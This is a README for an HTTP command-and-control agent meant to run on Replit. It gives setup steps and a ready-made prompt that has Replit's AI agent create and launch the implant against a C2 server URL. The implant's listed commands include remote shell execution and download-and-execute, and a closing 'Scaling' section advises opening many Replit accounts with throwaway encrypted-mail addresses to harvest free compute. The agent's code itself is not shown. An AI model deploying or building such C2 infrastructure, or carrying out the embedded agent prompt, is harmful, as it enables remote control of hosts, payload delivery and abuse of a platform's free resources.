# Replit C2 Agent

Simple HTTP-based C2 agent for Replit platform.

## Quick Start

1. **Create new Replit project:**
   - Go to https://replit.com
   - Click "Create Repl"
   - Select "Python" template

2. **Copy agent code:**
   - Copy `agent.py` to your Repl

3. **Run with your C2 server:**
   ```python
   # In Replit Shell:
   C2_SERVER_URL=http://your-c2-server:5000 python main.py
   ```

## Commands for Replit Agent

Tell Replit Agent:

```
"Create a Python file called main.py with this code:

[paste agent.py code]

Then run it with environment variable C2_SERVER_URL=http://your-server:5000"
```

## Supported Commands

| Command | Description |
|---------|-------------|
| `ping` | Check agent alive |
| `shell` | Execute shell command |
| `download` | Download and execute file |
| `sleep` | Change beacon interval |
| `exit` | Stop agent |

## Environment Variables

- `C2_SERVER_URL` - C2 server URL (required)
- `C2_AUTH_TOKEN` - Authentication token (optional)

## Example Usage

```bash
# Run agent
python main.py http://localhost:5000

# With auth token
python main.py http://localhost:5000 my-secret-token
```

## Scaling

Create multiple Replit accounts with different emails (ProtonMail, Tutanota).
Each account gets free compute resources.
